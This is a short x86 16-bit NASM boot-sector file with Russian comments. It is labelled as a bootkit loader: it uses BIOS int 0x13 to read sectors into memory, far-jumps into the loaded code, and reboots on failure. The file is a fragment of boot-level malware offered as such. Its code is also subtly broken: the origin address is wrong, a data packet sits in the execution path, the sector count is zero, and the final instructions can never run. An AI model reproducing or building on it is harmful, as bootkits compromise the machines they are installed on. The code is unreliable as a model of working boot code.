USE 16 ; Use 16b

ORG 0xc700 ; Первый загрузочный сектор

;;;;;;;;;;;;;;;;;;;;;;;;
%define STACK_SEGMENT 0x000 ; !!!STACK!!!
%define UPLOAD_SEGMENT 0x8000 ; !!!UPLOAD SECTOR!!! <Version>
%define AH_AL_INTERRUPT 0x4280 ; Using interrupts
%define BIOS_RESET_CODE_1 0xf000 ; BIOS_RESET
%define BIOS_RESET_CODE_2 0xfff0 ; BIOS_RESET
;;;;;;;;;;;;;;;;;;;;;;;;

START:

jmp interrupt_case
times 4 - ($-$$) nop

interrupt_case:
cli

xor ax, ax
mov ds, ax
mov ss, ax
mov sp, STACK_SEGMENT

sti

mov si, upload_bootkit
mov ax, AH_AL_INTERRUPT

int 0x13

jc kill_service

upload_bootkit:
db 0x10, 0x00
dw 0x00
dw 0x00
dw UPLOAD_SEGMENT
dq 0x00


push word UPLOAD_SEGMENT ; Сохраняем драйвер
push word 0x0200
retf

kill_service: ; Даем возможность для перезагрузки. ЭниКей.
xor ax,ax
int 0x16
int 0x19

push BIOS_RESET_CODE_1
push BIOS_RESET_CODE_2

